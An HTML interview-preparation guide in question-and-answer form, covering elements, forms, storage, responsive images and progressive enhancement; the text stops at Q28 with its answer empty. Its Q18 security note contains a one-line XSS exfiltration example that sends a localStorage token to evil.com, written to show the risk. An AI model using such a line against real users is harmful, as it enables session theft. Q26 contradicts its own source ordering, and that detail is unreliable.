# 🚀 HTML Interview Preparation Guide
> 🟢 Easy | 🟡 Medium | 🔴 Advanced

---

## Table of Contents
- [🟢 Q1 - What is HTML and how does it work?](#q1-what-is-html-and-how-does-it-work)
- [🟢 Q2 - What is `<!DOCTYPE html>` and why is it needed?](#q2-what-is-doctype-html-and-why-is-it-needed)
- [🟢 Q3 - What is the difference between an HTML element and a tag?](#q3-what-is-the-difference-between-an-html-element-and-a-tag)
- [🟢 Q4 - What is the difference between `id` and `class`?](#q4-what-is-the-difference-between-id-and-class)
- [🟢 Q5 - What is the difference between `<div>` and `<span>`?](#q5-what-is-the-difference-between-div-and-span)
- [🟢 Q6 - What are block-level and inline elements?](#q6-what-are-block-level-and-inline-elements)
- [🟢 Q7 - What is the difference between `<section>`, `<article>`, `<aside>`, and `<div>`?](#q7-what-is-the-difference-between-section-article-aside-and-div)
- [🟢 Q8 - What is the purpose of the `meta viewport` tag?](#q8-what-is-the-purpose-of-the-meta-viewport-tag)
- [🟢 Q9 - What is the difference between `<input type="button">` and `<button>`?](#q9-what-is-the-difference-between-input-typebutton-and-button)
- [🟢 Q10 - What are `<header>`, `<nav>`, `<main>`, `<aside>`, and `<footer>` used for?](#q10-what-are-header-nav-main-aside-and-footer-used-for)
- [🟢 Q11 - What is the difference between GET and POST?](#q11-what-is-the-difference-between-get-and-post)
- [🟢 Q12 - What are `action` and `method` in a form?](#q12-what-are-action-and-method-in-a-form)
- [🟢 Q13 - What is the purpose of the `<label>` element?](#q13-what-is-the-purpose-of-the-label-element)
- [🟢 Q14 - What is the difference between `disabled`, `readonly`, and `required`?](#q14-what-is-the-difference-between-disabled-readonly-and-required)
- [🟢 Q15 - What is the `name` attribute used for in form inputs?](#q15-what-is-the-name-attribute-used-for-in-form-inputs)
- [🟡 Q16 - What are semantic HTML elements and why are they important?](#q16-what-are-semantic-html-elements-and-why-are-they-important)
- [🟡 Q17 - What is the difference between `async` and `defer` on script tags?](#q17-what-is-the-difference-between-async-and-defer-on-script-tags)
- [🟡 Q18 - What is the difference between `localStorage`, `sessionStorage`, and cookies?](#q18-what-is-the-difference-between-localstorage-sessionstorage-and-cookies)
- [🟡 Q19 - How do you optimize image loading in HTML?](#q19-how-do-you-optimize-image-loading-in-html)
- [🟡 Q20 - What is progressive enhancement vs graceful degradation?](#q20-what-is-progressive-enhancement-vs-graceful-degradation)
- [🟡 Q21 - Why should you use `<button>` instead of a clickable `<div>`?](#q21-why-should-you-use-button-instead-of-a-clickable-div)
- [🟡 Q22 - How does HTML form validation work?](#q22-how-does-html-form-validation-work)
- [🟡 Q23 - What are the major features introduced in HTML5?](#q23-what-are-the-major-features-introduced-in-html5)
- [🟡 Q24 - What is the difference between Canvas and SVG?](#q24-what-is-the-difference-between-canvas-and-svg)
- [🟡 Q25 - What are `<audio>` and `<video>` used for?](#q25-what-are-audio-and-video-used-for)
- [🟡 Q26 - What are `<picture>` and `srcset` used for?](#q26-what-are-picture-and-srcset-used-for)
- [🟡 Q27 - What is lazy loading and how does `loading="lazy"` work?](#q27-what-is-lazy-loading-and-how-does-loadinglazy-work)
- [🟡 Q28 - What is web accessibility?](#q28-what-is-web-accessibility)
- [🔴 Q29 - How does the browser parse and render HTML? Explain the critical rendering path.](#q29-how-does-the-browser-parse-and-render-html-explain-the-critical-rendering-path)
- [🔴 Q30 - What are Web Components?](#q30-what-are-web-components)
- [🔴 Q31 - How can you optimize HTML page performance?](#q31-how-can-you-optimize-html-page-performance)
- [🔴 Q32 - Why is the `alt` attribute important?](#q32-why-is-the-alt-attribute-important)
- [🔴 Q33 - What is ARIA and when should you use it?](#q33-what-is-aria-and-when-should-you-use-it)
- [🔴 Q34 - What is the difference between semantic HTML and ARIA?](#q34-what-is-the-difference-between-semantic-html-and-aria)
- [🔴 Q35 - How do you make an HTML form accessible?](#q35-how-do-you-make-an-html-form-accessible)
- [🔴 Q36 - How do you make a website keyboard accessible?](#q36-how-do-you-make-a-website-keyboard-accessible)
- [🔴 Q37 - What is the difference between `innerHTML`, `textContent`, and `innerText`?](#q37-what-is-the-difference-between-innerhtml-textcontent-and-innertext)

---

### Q1. What is HTML and how does it work?

**Answer:**
HTML (HyperText Markup Language) is the markup language that defines the structure and content of web pages. It's not a programming language — no logic, loops, or variables — just a system of tags that describe what content is (a heading, a paragraph, a list, an image).

How it works: you write elements in a text file (.html), a browser parses that file top to bottom, builds a tree structure called the DOM (Document Object Model), and renders it visually. CSS then styles that DOM, and JavaScript can manipulate it dynamically. So HTML = structure, CSS = presentation, JS = behavior.

```html
<h1>Title</h1>
<p>Some text.</p>
```

The browser reads this and knows "Title" is a top-level heading, "Some text" is a paragraph — and applies default styling and semantics accordingly.

---

### Q2. What is `<!DOCTYPE html>` and why is it needed?

**Answer:**
It's a declaration at the very top of an HTML file that tells the browser which version of HTML to use for rendering. `<!DOCTYPE html>` specifically declares HTML5.

Why it matters: without it, browsers fall back to quirks mode — an old rendering mode that mimics buggy behavior from 1990s browsers (inconsistent box model, weird CSS handling) for backward compatibility. With the doctype, browsers use standards mode, which follows modern, consistent spec behavior.

It's not a tag (no closing tag, not part of the DOM) — it's an instruction to the parser. Always the first line, case-insensitive.

---

### Q3. What is the difference between an HTML element and a tag?

**Answer:**
- **Tag** — The markup syntax itself: the angle-bracket notation like `<p>` or `</p>`.
- **Element** — The tag(s) plus everything they contain: opening tag, content, closing tag.

So `<p>` is a tag. `<p>Hello</p>` is the element. Some elements are self-closing/void and have no separate closing tag (`<img>`, `<br>`, `<input>`) — these are still elements, just tags without content or a closing pair.

People use "tag" and "element" interchangeably in casual conversation, but technically the tag is the label, the element is the whole unit.

---

### Q4. What is the difference between `id` and `class`?

**Answer:**

| | `id` | `class` |
|---|---|---|
| Uniqueness | Must be unique per page (one element only) | Reusable across many elements |
| Count per element | One `id` per element | Multiple classes allowed (`class="card active"`) |
| CSS selector | `#myId` | `.myClass` |
| Specificity | Higher (harder to override in CSS) | Lower |
| Typical use | JS hooks, anchor links (`#section`), unique styling | Reusable styling patterns, JS hooks for groups |

**Rule of thumb:** use `class` for anything reusable (buttons, cards, layout patterns). Use `id` for a genuinely unique element — a specific JS target, a fragment link, or a `<label for>` association. Don't rely on `id` for styling if you might reuse that style elsewhere later.

---

### Q5. What is the difference between `<div>` and `<span>`?

**Answer:**
Both are generic, non-semantic containers with no inherent meaning — they exist purely for grouping content so you can style or script it.

- **`<div>`** — Block-level. Takes up the full width available, starts on a new line, used to group larger structural chunks (sections, containers, layout wrappers).
- **`<span>`** — Inline. Only as wide as its content, doesn't break the line, used to wrap small bits of text or inline content for styling (e.g., highlighting one word in a sentence).

```html
<div>This is a block container.</div>
<p>Some text with a <span>highlighted word</span> inside it.</p>
```

Neither carries semantic meaning — prefer semantic tags (see Q16) when a more meaningful element fits.

---

### Q6. What are block-level and inline elements?

**Answer:**
**Block-level elements:**
- Start on a new line, take full available width by default
- Can contain other block or inline elements
- Respect `width`/`height`/`margin`/`padding` on all sides
- Examples: `<div>`, `<p>`, `<h1>`–`<h6>`, `<ul>`, `<li>`, `<section>`, `<form>`

**Inline elements:**
- Flow within a line of text, only take up as much width as their content
- Can't contain block-level elements
- `width`/`height` are ignored; vertical `margin`/`padding` behaves inconsistently
- Examples: `<span>`, `<a>`, `<strong>`, `<em>`, `<img>` (technically inline, but replaced)

**Note:** this is the default rendering behavior, defined by the browser's default stylesheet — the CSS `display` property can override it (`display: inline-block`, `display: block`, `display: flex`, etc.), so it's not a fixed rule, just a starting point.

---

### Q7. What is the difference between `<section>`, `<article>`, `<aside>`, and `<div>`?

**Answer:**
- **`<section>`** — A thematic grouping of content, typically with a heading. Used for chapters, tabbed content, or numbered sections — a distinct part of a larger whole (e.g., a "Reviews" section on a product page).
- **`<article>`** — Self-contained content that could be distributed independently (blog post, news article, comment, product card).
- **`<aside>`** — Content tangentially related to the main content (sidebar, pull quote, advertising).
- **`<div>`** — A generic, non-semantic block container with no inherent meaning. Use it only when no semantic element fits.

**Quick test:** "Could this be syndicated/shared standalone (like via RSS)?" → `<article>`. "Is this a themed chunk of a bigger page, not standalone?" → `<section>`. "Does it carry no meaning, just grouping for style?" → `<div>`.

```html
<article>
  <h2>Blog Post Title</h2>
  <section>
    <h3>Comments</h3>
    ...
  </section>
</article>
```

**Notes:** `<section>` should generally contain a heading — if it doesn't need one and is just a layout wrapper, it's probably a `<div>` in disguise. And as a general rule, if removing an element would make the page harder to understand for screen readers, use a semantic element; if it's purely for layout/styling, use `<div>`.

---

### Q8. What is the purpose of the `meta viewport` tag?

**Answer:**
```html
<meta name="viewport" content="width=device-width, initial-scale=1">
```
Without it, mobile browsers render the page at a typical desktop width (~980px) and then scale it down, making text tiny. The viewport meta tag tells the browser to:
- Set the viewport width to the device's actual screen width (`width=device-width`).
- Use a 1:1 zoom ratio (`initial-scale=1`).

This is required for CSS media queries to work correctly on mobile devices.

---

### Q9. What is the difference between `<input type="button">` and `<button>`?

**Answer:**
- **`<input type="button">`** — Self-closing, content set via `value` attribute, cannot contain HTML markup.
- **`<button>`** — Can contain HTML (icons, spans, images), supports `type="submit"`, `type="reset"`, `type="button"`. More flexible and semantic.

Default `type` for `<button>` is **`submit`** when inside a form, which is a common gotcha.

---

### Q10. What are `<header>`, `<nav>`, `<main>`, `<aside>`, and `<footer>` used for?

**Answer:**
These are HTML5 landmark elements — they define regions of a page and are exposed to assistive tech as navigable landmarks.

- **`<header>`** — intro content for the page or a section — logo, title, nav, tagline. Can appear multiple times (e.g., one per `<article>`).
- **`<nav>`** — major navigation blocks (primary menu, breadcrumbs, pagination). Not for every link — just significant nav groups.
- **`<main>`** — the primary, unique content of the page. Only one per page, not nested inside `<article>`/`<aside>`/`<header>`/`<footer>`.
- **`<aside>`** — content tangentially related to the main content — sidebars, pull quotes, related links, ads.
- **`<footer>`** — closing info for the page or section — copyright, contact info, related links. Can also repeat per section.

```html
<header><nav>...</nav></header>
<main>
  <article>...</article>
  <aside>Related articles...</aside>
</main>
<footer>...</footer>
```

---

### Q11. What is the difference between GET and POST?

**Answer:**
Both are HTTP methods used to submit form data or request resources, but they differ fundamentally:

| | GET | POST |
|---|---|---|
| Data location | Appended to URL as query string (`?name=value`) | Sent in the request body |
| Visibility | Visible in URL, browser history, logs | Not visible in URL |
| Data limit | Limited by URL length (~2000 chars practically) | No practical limit |
| Idempotent/safe | Yes — shouldn't change server state | No — often changes state (create/update/delete) |
| Cacheable | Yes, by default | No, by default |
| Bookmarkable | Yes | No |
| Use case | Fetching/searching data (search forms, filters) | Submitting sensitive or large data (login, file upload, creating records) |

**Rule of thumb:** GET for retrieving/reading, POST for submitting/changing data — especially anything sensitive (passwords should never go in a GET, since they'd land in the URL and browser history).

---

### Q12. What are `action` and `method` in a form?

**Answer:**
Both are attributes on `<form>` that control where and how data is submitted.

- **`action`** — the URL the form data is sent to. If omitted, it defaults to the current page URL.
- **`method`** — the HTTP method used to send the data — typically GET or POST (see Q11).

```html
<form action="/submit-login" method="POST">
  <input type="text" name="username">
  <input type="password" name="password">
  <button type="submit">Log in</button>
</form>
```

On submit, the browser sends a request to `/submit-login` using POST, with the form's input values in the request body (keyed by each input's `name` attribute — see Q15).

---

### Q13. What is the purpose of the `<label>` element?

**Answer:**
`<label>` associates descriptive text with a form control (`<input>`, `<textarea>`, `<select>`, etc.). It's not just visual — it creates a programmatic link.

**Two ways to associate:**
```html
<!-- Method 1: for/id matching -->
<label for="email">Email</label>
<input type="email" id="email" name="email">

<!-- Method 2: wrapping -->
<label>
  Email
  <input type="email" name="email">
</label>
```

**Why it matters:**
- **Click target expansion** — clicking the label text focuses/activates the associated input (huge for checkboxes/radio buttons and mobile usability).
- **Screen readers** — announce the label when the input receives focus — without it, a screen reader user hears "edit text" with no context.
- **Form usability** — larger, clearer click targets overall.

A `placeholder` is not a substitute for a `<label>` — it disappears on input and isn't reliably announced by all assistive tech.

---

### Q14. What is the difference between `disabled`, `readonly`, and `required`?

**Answer:**

| Attribute | Effect | Submitted with form? | User can focus/select? |
|---|---|---|---|
| `disabled` | Field is fully inactive — greyed out, unclickable | No | No |
| `readonly` | Field shows its value but can't be edited | Yes | Yes (can be focused/selected/copied) |
| `required` | Field must be filled before form submits (triggers validation) | Yes | Yes |

```html
<input type="text" value="Locked" disabled>   <!-- not submitted, not focusable -->
<input type="text" value="Fixed" readonly>    <!-- submitted, visible/copyable, not editable -->
<input type="text" required>                  <!-- must have a value to submit -->
```

**Use `readonly`** when you want the value visible/selectable but not changed (e.g., a pre-filled reference number). **Use `disabled`** when the field is irrelevant/inactive entirely (e.g., a shipping field disabled when "same as billing" is checked).

---

### Q15. What is the `name` attribute used for in form inputs?

**Answer:**
`name` is the key used to identify each input's value when the form is submitted. Without it, the input's data is not included in the submission at all — even if it has a value.

```html
<input type="text" name="username" value="alex">
```

On submit, this becomes part of the request as `username=alex` (in the URL for GET, or the body for POST). The server reads incoming data by these `name` keys.

**Distinction from `id`:** `id` is for CSS/JS/label targeting (must be unique on the page); `name` is for form submission (can repeat across radio buttons in a group — they share a `name` so only one can be selected).

```html
<input type="radio" name="plan" value="basic"> Basic
<input type="radio" name="plan" value="pro"> Pro
```

Both radios share `name="plan"` so they behave as one mutually-exclusive group.

---

### Q16. What are semantic HTML elements and why are they important?

**Answer:**
Semantic HTML elements clearly describe their meaning to both the browser and the developer — not just how they render. Contrast with `<div>`/`<span>`, which say nothing about content. Examples: `<header>`, `<nav>`, `<main>`, `<footer>`, `<article>`, `<section>`, `<aside>`, `<figure>`, `<time>`.

**Why they matter:**
1. **Accessibility** — Screen readers use semantic elements to build the accessibility tree and page outline; a blind user can jump straight to `<nav>` or `<main>` instead of tabbing through everything. Non-semantic `<div>` soup is invisible to this system.
2. **SEO** — Search engines use semantic structure to understand content hierarchy and relevance; `<article>` and `<h1>` carry more weight than a `<div>` with the same text.
3. **Maintainability** — Code is self-documenting and easier to read; `<header>` tells you what it is at a glance vs. `<div class="header-wrapper-2">`.
4. **Browser defaults** — Some elements carry built-in behavior (e.g., `<button>` is keyboard-focusable by default; a `<div>` isn't).
5. **Future-proofing** — Semantic markup separates meaning from presentation, so redesigns don't require restructuring your document's logic.

```html
<header><nav>...</nav></header>
<main>
  <article>
    <h1>Post title</h1>
    <p>Content...</p>
  </article>
</main>
<footer>...</footer>
```

Use semantic tags whenever a meaningful one exists for the content; fall back to `<div>`/`<span>` only when there's genuinely no semantic fit.

---

### Q17. What is the difference between `async` and `defer` on script tags?

**Answer:**
Both are boolean attributes on `<script src="...">` that change how external scripts load relative to HTML parsing, avoiding the default render-blocking behavior. Without either, the browser stops parsing HTML entirely, fetches the script, executes it, then resumes parsing — a major performance bottleneck.

| | `async` | `defer` |
|---|---|---|
| Download | Parallel with HTML parsing | Parallel with HTML parsing |
| Execution | Immediately when downloaded (pauses parsing) | After HTML is fully parsed, before `DOMContentLoaded` |
| Order | Not guaranteed — whichever finishes downloading first runs first | Preserved (document order), guaranteed |
| Use case | Independent scripts (analytics, ads) | Scripts that depend on the DOM or on each other |

**Timeline comparison:**
```
Default:  [--parse--][fetch][exec][--parse resumes--]
async:    [--parse--------][fetch]
                                  [exec, parse paused][--parse resumes--]
defer:    [--parse to completion--][exec in order]→DOMContentLoaded
```

**Practical rule of thumb:**
- Use `defer` for your main application scripts, especially multiple scripts that depend on each other or the DOM
- Use `async` for standalone third-party scripts with no dependencies (analytics, ads)
- Neither attribute has any effect on inline `<script>` blocks (no `src`) — those still block synchronously wherever they appear
- `type="module"` scripts are deferred by default automatically

---

### Q18. What is the difference between `localStorage`, `sessionStorage`, and cookies?

**Answer:**
All three are browser-side key-value storage, but they differ in lifetime, size, and — critically — whether the browser automatically sends them to the server.

| Feature | `localStorage` | `sessionStorage` | Cookies |
|---|---|---|---|
| Expiry | Never (until explicitly cleared) | Cleared when the tab closes | Set via `Expires`/`Max-Age`; session cookie if omitted |
| Capacity | ~5-10 MB | ~5 MB | ~4 KB per cookie |
| Sent to server | No — stays in browser | No — stays in browser | **Yes, automatically, on every matching request** (including images, CSS, XHR) |
| Access | JS only (unless disabled) | JS only | JS + Server (unless `HttpOnly`) |
| Scope | Per origin, shared across all tabs | Per tab **and** per origin — a new tab gets a fresh, empty store even for the same site | Per domain/path, configurable via cookie attributes |
| Typical use | Preferences, theme, cached data, "remember me" tokens | Temporary form data, wizard state, per-tab session info | Session/auth tracking, server-stored state |

**Why "sent to server" is the important row:** cookies are attached to *every* HTTP request automatically by the browser — this is how classic session-based auth works (server sets a cookie, browser echoes it back on each request, no JS needed). `localStorage`/`sessionStorage` never leave the browser unless your JS code explicitly reads them and sends them (e.g. in an `Authorization` header). That also means cookies carry CSRF risk (a request from *any* site triggers your cookies to be sent) while `localStorage` doesn't — but `localStorage` is fully readable by any script running on the page, which is where XSS risk comes in.

**API basics:**
```js
// localStorage / sessionStorage — same API, different lifetime
localStorage.setItem('theme', 'dark');
localStorage.getItem('theme');   // 'dark'
localStorage.removeItem('theme');
localStorage.clear();

sessionStorage.setItem('step', '2');

// Cookies — string-based, manual parsing
document.cookie = "theme=dark; max-age=3600; path=/; SameSite=Lax";
document.cookie; // "theme=dark" — you get ALL cookies as one string, must parse it yourself
```
**Important:** both `localStorage` and `sessionStorage` only store strings — objects must be serialized with `JSON.stringify`/`JSON.parse`.

**Key cookie attributes worth knowing (common follow-up):**
- `HttpOnly` — blocks JS access entirely (`document.cookie` won't show it); mitigates XSS token theft.
- `Secure` — only sent over HTTPS.
- `SameSite=Strict|Lax|None` — controls whether the cookie is sent on cross-site requests; primary defense against CSRF.

**Security note:** Never store JWTs or session tokens in `localStorage`/`sessionStorage`. Because they're plain JS-readable storage, any successful XSS attack (e.g. via a compromised dependency or unsanitized user input) can read and exfiltrate them in one line: `fetch('evil.com?t=' + localStorage.getItem('token'))`. Cookies with `HttpOnly` avoid this specific attack since JS can't read them at all — the trade-off is you then need `SameSite`/CSRF tokens to cover the gap `HttpOnly` doesn't close.

**In practice:** most production apps use `HttpOnly` + `Secure` + `SameSite=Strict` cookies for auth tokens, and reserve `localStorage` for non-sensitive UI state (theme, layout preferences, draft form data).

---

### Q19. How do you optimize image loading in HTML?

**Answer:**
Image optimization targets three things: fewer bytes downloaded, right format/resolution for the device, and no layout disruption while images load. Techniques below map to one or more of these.

1. **`loading="lazy"`** — Browser defers fetching off-screen images until they're near the viewport (a rough native threshold, not configurable). Cuts initial page weight on long pages. Don't use it on above-the-fold images — it delays your LCP (Largest Contentful Paint) candidate. For the hero/first-viewport image, use `fetchpriority="high"` instead to fetch it *sooner*.

2. **`srcset` + `sizes`** — Solves the *resolution* problem: serve a smaller file to small/low-DPI screens instead of shipping one large image everywhere.
```html
   <img
     src="photo-800.jpg"
     srcset="photo-400.jpg 400w, photo-800.jpg 800w, photo-1600.jpg 1600w"
     sizes="(max-width: 600px) 100vw, 50vw"
     alt="..." />
```
   `srcset` lists candidates with their intrinsic width (`400w` = 400px wide). `sizes` tells the browser how much viewport space the image will occupy at different breakpoints, *before* layout — the browser combines this with screen density to pick the best candidate. Without `sizes`, the browser assumes the image fills 100% of the viewport, defeating the point.

3. **`<picture>`** — Solves the *format* problem: let the browser pick the smallest format it supports, with older formats as fallback. `<source>` elements are tried top-to-bottom; the browser uses the first one it understands, falling back to the `<img>` at the end if none match.
```html
   <picture>
     <source srcset="hero.avif" type="image/avif" />
     <source srcset="hero.webp" type="image/webp" />
     <img src="hero.jpg" alt="Hero" loading="lazy" width="800" height="400" />
   </picture>
```
   AVIF/WebP are typically 30-50% smaller than JPEG at equivalent visual quality — this is usually the single biggest byte-savings win on this list. `<picture>` can also be used for *art direction* (different crops per breakpoint), not just format switching — that's a common follow-up distinction.

4. **`width`/`height` attributes** — Without these, the browser doesn't know the image's aspect ratio until it downloads, so it renders a 0-height box that suddenly expands once the image arrives — pushing all content below it down. That shift is exactly what CLS (Cumulative Layout Shift, a Core Web Vital) measures. Setting both lets the browser reserve the correct space immediately, even before the image loads. Modern approach: set them *and* let CSS override the actual display size — the ratio is preserved automatically:
```css
   img { width: 100%; height: auto; aspect-ratio: attr(width) / attr(height); }
```

5. **CDN** — Serves images from edge servers geographically closer to the user, cutting network latency. Most image CDNs (Cloudinary, Imgix, Cloudflare Images) also do on-the-fly resizing/format conversion via URL parameters, which subsumes points 2 and 3 without you having to generate multiple files manually.

6. **Compression** — Lossy compression (Squoosh, ImageOptim, or build-time tools like `sharp`) reduces file size by discarding imperceptible detail. Should happen regardless of format — a compressed JPEG is still smaller than an uncompressed one.

**Combined example** — lazy-loaded, multi-format, responsive, layout-stable:
```html
<picture>
  <source srcset="hero-400.avif 400w, hero-800.avif 800w" type="image/avif" sizes="(max-width: 600px) 100vw, 50vw" />
  <source srcset="hero-400.webp 400w, hero-800.webp 800w" type="image/webp" sizes="(max-width: 600px) 100vw, 50vw" />
  <img src="hero-800.jpg" alt="Hero" loading="lazy" width="800" height="400" />
</picture>
```

**One nuance worth mentioning in an interview:** `loading="lazy"`, `srcset`/`sizes`, and `width`/`height` are declarative HTML — no JS or build tooling needed. `<picture>` with modern formats and CDN transforms usually *do* need a build step or image service to generate the variants. Knowing which optimizations are "free" vs. require infrastructure is a useful distinction to draw.

---

### Q20. What is progressive enhancement vs graceful degradation?

**Answer:**
Both describe how to handle varying browser capabilities, network conditions, and assistive tech — but they start from opposite ends and build (or strip) in opposite directions.

**Progressive Enhancement** — Start with a minimal, functional baseline (semantic HTML, working links/forms with real server round-trips) that works with *no* CSS, JS, or modern browser features. Then layer on enhancements — CSS for layout, JS for interactivity, modern APIs — for browsers/devices that support them. Nothing is *removed* for less-capable clients; they simply don't get the extra layers.

```html
<!-- Baseline: works with JS disabled, screen readers, text browsers -->
<form action="/search" method="GET">
  <input name="q" />
  <button type="submit">Search</button>
</form>
```
```js
// Enhancement layer: intercept submit, do it via fetch for a smoother UX
form.addEventListener('submit', async (e) => {
  e.preventDefault();
  const results = await fetch(`/search?q=${input.value}`).then(r => r.json());
  renderResults(results); // if this JS never runs, the form above still works
});
```

**Graceful Degradation** — Start by building the full-featured experience for modern browsers, then add fallback handling so things don't *break* on older/less-capable ones. The full experience is the default; older browsers get a reduced but still-functional version, reached by explicitly checking and handling failure cases.

```js
if ('IntersectionObserver' in window) {
  // modern lazy-loading behavior
} else {
  // fallback: just load all images upfront
  images.forEach(img => img.src = img.dataset.src);
}
```

**The actual difference isn't "mobile-first vs desktop-first"** (that's a related but separate responsive-design concept) — it's the *starting assumption and direction of dependency*:
- PE assumes **nothing** works until proven otherwise, and treats advanced features as strictly optional add-ons. If JS fails to load entirely, the core task (submitting the form) still completes.
- GD assumes the **full feature set** works, and retrofits exceptions for cases where it doesn't. If you forget to handle a fallback case, the experience breaks rather than degrading — the burden is on the developer to anticipate every failure mode.

**Why PE is generally preferred:**
- **Resilience by default** — failures (network drop mid-load, ad blocker killing a script, corporate JS-disabled environment) fail *safely* rather than breaking the page, because you never depended on the enhancement in the first place.
- **Accessibility-aligned** — screen readers and other assistive tech often rely on exactly the semantic-HTML baseline PE starts from.
- **Performance-aligned** — the baseline is lightweight by construction; GD's "build everything, then patch" approach tends to ship more code overall, some of which exists only for edge cases.

**Trade-off, for balance:** PE takes more upfront design discipline — you have to actually think through and build the no-JS path, which teams under deadline pressure often skip anyway (shipping something that's PE "in name only"). GD is faster to build initially if your real user base is >99% modern browsers, which is genuinely true for many internal/enterprise tools — the risk profile is different from a public consumer site.

**Concrete modern example many candidates miss:** CSS itself supports PE via `@supports`:
```css
.grid { display: block; } /* baseline */
@supports (display: grid) {
  .grid { display: grid; grid-template-columns: repeat(3, 1fr); } /* enhancement */
}
```

---

### Q21. Why should you use `<button>` instead of a clickable `<div>`?

**Answer:**
A `<div>` with a click handler looks like a button but lacks all the behavior browsers give buttons for free:

- **Keyboard accessibility** — `<button>` is focusable via Tab and activatable via Enter/Space by default. A `<div>` isn't focusable or keyboard-operable unless you manually add `tabindex`, `role="button"`, and `keydown` handlers for Enter/Space.
- **Screen reader semantics** — `<button>` announces itself as "button" to assistive tech. A `<div>` announces nothing — it's just a generic container.
- **Form integration** — `<button type="submit">` triggers form submission natively.
- **Built-in states** — `:focus`, `:disabled`, `:active` styling and behavior work out of the box.

Using a `<div>` means reimplementing all of this manually and almost always missing edge cases (e.g., disabled state, screen reader labeling). It's more code for a worse, less accessible result — there's essentially no upside.

---

### Q22. How does HTML form validation work?

**Answer:**
Modern browsers provide built-in client-side validation via HTML attributes — no JavaScript required for basic cases.

**Common validation attributes:**
- `required` — field must have a value
- `type="email"` / `type="url"` — enforces basic format
- `min` / `max` — numeric or date range
- `minlength` / `maxlength` — character length
- `pattern` — custom regex match

```html
<input type="email" required>
<input type="number" min="1" max="10">
<input type="text" pattern="[A-Za-z]{3,}" minlength="3">
```

**How it works:** when the form is submitted, the browser checks each field against its constraints (this is called the Constraint Validation API under the hood). If any fail, submission is blocked and the browser shows a native error tooltip pointing at the offending field.

**Important caveat:** client-side validation is a UX convenience, not a security measure. It can be bypassed (disabled JS, direct API calls), so the server must always re-validate everything independently. You can also hook into the Constraint Validation API via JS (`element.checkValidity()`, `element.setCustomValidity()`) for custom messages/logic.

---

### Q23. What are the major features introduced in HTML5?

**Answer:**
HTML5 (finalized ~2014) was a large leap from HTML4/XHTML. Key additions:

- **Semantic elements**: `<header>`, `<nav>`, `<main>`, `<article>`, `<section>`, `<aside>`, `<footer>`, `<figure>`
- **Media elements**: `<audio>`, `<video>` — native playback without Flash/plugins
- **Canvas**: `<canvas>` for 2D pixel-based drawing via JS
- **New form input types**: `email`, `date`, `number`, `range`, `color`, `tel`, `search`, plus new attributes (`required`, `placeholder`, `pattern`)
- **Storage APIs**: `localStorage`, `sessionStorage` (no more cookies-only client storage)
- **Offline/App-like APIs**: Application Cache (later replaced by Service Workers), Web Workers (background threading), Geolocation API
- **Drag and Drop API**: native `draggable` attribute + events
- **SVG integration**: inline `<svg>` support directly in HTML
- **Simpler doctype**: `<!DOCTYPE html>` replacing the verbose HTML4/XHTML doctype strings
- **`contenteditable`, History API** (`pushState`/`popState` for SPA routing)

The overarching theme: reduce reliance on plugins (Flash, Silverlight), add native APIs for what used to require heavy JS libraries, and formalize semantic structure.

---

### Q24. What is the difference between Canvas and SVG?

**Answer:**
Both render graphics in the browser, but with fundamentally different models:

| | Canvas | SVG |
|---|---|---|
| Type | Raster (pixel-based bitmap) | Vector (XML-based shape descriptions) |
| DOM presence | Single `<canvas>` element — no DOM nodes for shapes | Each shape is its own DOM node (`<circle>`, `<rect>`, etc.) |
| Scaling | Pixelates when scaled up | Scales infinitely without quality loss |
| Performance | Better for many objects / frequent redraws (games, real-time visualizations) | Better for fewer, static/semi-static objects |
| Interactivity | Manual — must calculate hit detection yourself in JS | Native — each shape can have its own event listeners, CSS styles |
| Accessibility | Poor — it's just pixels, nothing for screen readers | Better — DOM nodes can have ARIA labels, are inspectable |
| Editing | Draw via JS API only, imperative (`ctx.fillRect(...)`) | Declarative markup, editable in dev tools like HTML |

**Rule of thumb:** Canvas for high-performance, pixel-level, animation-heavy work (games, particle effects, image processing). SVG for icons, logos, charts, diagrams — things that need to scale crisply and stay interactive/accessible.

---

### Q25. What are `<audio>` and `<video>` used for?

**Answer:**
Native HTML5 elements for embedding media without plugins (replacing old Flash-based players).

```html
<video controls width="640" poster="thumbnail.jpg">
  <source src="movie.mp4" type="video/mp4">
  <source src="movie.webm" type="video/webm">
  Your browser doesn't support video.
</video>

<audio controls>
  <source src="song.mp3" type="audio/mpeg">
</audio>
```

**Key attributes:**
- `controls` — shows native play/pause/volume UI
- `autoplay` — starts automatically (often blocked unless `muted` is also set, due to browser policy)
- `loop` — repeats playback
- `muted` — starts silent
- `poster` (video only) — thumbnail shown before playback
- Multiple `<source>` tags — browser picks the first supported format (fallback chain)

Both expose a JS API (`play()`, `pause()`, `currentTime`, event listeners like `ended`, `timeupdate`) for building custom players.

---

### Q26. What are `<picture>` and `srcset` used for?

**Answer:**
Both solve responsive images — serving different image files depending on screen size, resolution, or format support, instead of one fixed image for everyone.

**`srcset` (on `<img>`)** — lets the browser choose the best image from a set based on device pixel density or viewport width.

```html
<img 
  src="photo-800.jpg" 
  srcset="photo-400.jpg 400w, photo-800.jpg 800w, photo-1600.jpg 1600w"
  sizes="(max-width: 600px) 400px, 800px"
  alt="Description">
```

The browser calculates which file best fits the actual rendered size and screen density — smaller devices download smaller files, saving bandwidth.

**`<picture>`** — gives more control: lets you specify entirely different image sources (not just sizes) based on conditions like format support or art direction (cropping differently for mobile vs desktop).

```html
<picture>
  <source srcset="photo.webp" type="image/webp">
  <source srcset="photo.avif" type="image/avif">
  <img src="photo.jpg" alt="Description">
</picture>
```

Here the browser picks the first supported format (AVIF → WebP → JPEG fallback), reducing file size for browsers that support modern formats.

**Use `srcset` alone** for simple resolution switching; **use `<picture>`** when you need format switching or genuinely different crops/images per breakpoint.

---

### Q27. What is lazy loading and how does `loading="lazy"` work?

**Answer:**
Lazy loading defers fetching offscreen resources (images, iframes) until they're about to enter the viewport, instead of loading everything upfront. This improves initial page load time and saves bandwidth for content the user may never scroll to.

**Native implementation:**
```html
<img src="photo.jpg" loading="lazy" alt="Description">
<iframe src="embed.html" loading="lazy"></iframe>
```

`loading` accepts:
- `lazy` — defer loading until the element nears the viewport (browser-defined threshold)
- `eager` — load immediately (default behavior)
- `auto` — browser decides

**How it works under the hood:** the browser doesn't fetch the resource's bytes until it estimates the element will soon be scrolled into view (using an internal margin/threshold similar to IntersectionObserver). This is a native, no-JS solution, supported in all modern browsers.

**Caveat:** don't lazy-load above-the-fold images (e.g., a hero image) — it can delay their appearance and hurt perceived performance/Core Web Vitals (specifically LCP). Reserve `loading="lazy"` for images/iframes that are genuinely below the fold.

---

### Q28. What is web accessibility?

**Answer:**
